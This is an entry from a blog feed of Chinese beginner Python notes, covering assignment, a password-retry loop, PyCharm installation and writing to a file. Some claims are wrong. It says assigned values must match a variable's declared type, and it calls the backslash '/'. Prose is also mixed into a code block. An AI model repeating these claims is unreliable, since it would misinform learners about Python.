    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python学习笔记day 1</title>
    <link href="/2018/11/10/18/"/>
    <url>/2018/11/10/18/</url>
    
    <content type="html"><![CDATA[<h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><p>一、python的基本语法<br>二、安装pycharm<br>三、第一个python程序</p><h2 id="一、python的基本语法"><a href="#一、python的基本语法" class="headerlink" title="一、python的基本语法"></a>一、python的基本语法</h2><p>1、赋值的时候值类型要跟变量类型一样，比如<code>name = 12345</code>，name是字符型，值是整数型，整数型要加引号变成字符型才可以赋值；<br>2、缩进后的代码为代码块(默认缩进4字符)，比如:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">while</span> pwd != <span class="hljs-string">&#x27;1&#x27;</span>:<br>    print(<span class="hljs-string">&#x27;密码错误！请重新输入&#x27;</span>)<br>    name = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;please input your password:&#x27;</span>)<br>    pwd = name<br>print(<span class="hljs-string">&#x27;登录成功&#x27;</span>)<br></code></pre></div></td></tr></table></figure><p>3.循环语句不等于条件，先错后对，在错的后面可以重复执行，如上<br>4.input的使用：<code>input()</code>、调用第三方的使用：<code>import *</code>，模块的使用<br>5.文件的读写<code>f = open()、f.read()、f.close()</code><br>6.转义常用符：原始字符：r、反斜杠：/，其他转义符：<br><img src="/images/18/1.png"></p><h2 id="二、安装pycharm"><a href="#二、安装pycharm" class="headerlink" title="二、安装pycharm"></a>二、安装pycharm</h2><p>默认安装</p><h2 id="三、第一个python程序"><a href="#三、第一个python程序" class="headerlink" title="三、第一个python程序"></a>三、第一个python程序</h2><p>新建text.py，输入代码：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding:utf-8 -*- #声明编码</span><br>name = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;please input your password:&#x27;</span>) <span class="hljs-comment">#输入内容，把内容赋值给name</span><br>pwd = name <span class="hljs-comment">#把name的值给pwd</span><br><span class="hljs-keyword">while</span> pwd != <span class="hljs-string">&#x27;1&#x27;</span>: <span class="hljs-comment">#循环条件开始，判断pwd如果不等于1</span><br>    print(<span class="hljs-string">&#x27;密码错误！请重新输入&#x27;</span>) <span class="hljs-comment">#错误提示</span><br>    name = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;please input your password:&#x27;</span>) <span class="hljs-comment">#重新输入</span><br>    pwd = name <span class="hljs-comment">#把name的值给pwd，重新判断</span><br>print(<span class="hljs-string">&#x27;登录成功&#x27;</span>) <span class="hljs-comment">#成功信息</span><br><span class="hljs-keyword">import</span> test2 <span class="hljs-comment">#导入test.py</span><br>新建test2.py，写入代码：<br><span class="hljs-comment"># -*- coding:utf-8 -*- #声明编码</span><br><span class="hljs-keyword">import</span> os,sys <span class="hljs-comment">#导入系统库</span><br><span class="hljs-keyword">import</span> webbrowser <span class="hljs-comment">#导入浏览器库</span><br>n = <span class="hljs-string">&#x27;123&#x27;</span> <span class="hljs-comment">#把123赋值给n</span><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;help.txt&quot;</span>, <span class="hljs-string">&quot;r+&quot;</span>) <span class="hljs-comment">#打开help.txt，给读写权限</span><br>f.write(n) <span class="hljs-comment">#写入123</span><br>f.close() <span class="hljs-comment">#关闭文件</span><br></code></pre></div></td></tr></table></figure><p><img src="/images/18/2.png"><br>运行结果：<br><img src="/images/18/3.png"></p><h1 id="第一天总结"><a href="#第一天总结" class="headerlink" title="第一天总结"></a>第一天总结</h1><p>1.记得编码<br>2.记得赋值跟变量类型要一样<br>3.记得区分大小写<br>4.记得不要用word跟txt写代码<br>5.读写文件时记得一定要close()<br>6.命令行可以一句一句的调试，但是不能保存<br>7.转义符r在第一个引号的前面</p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
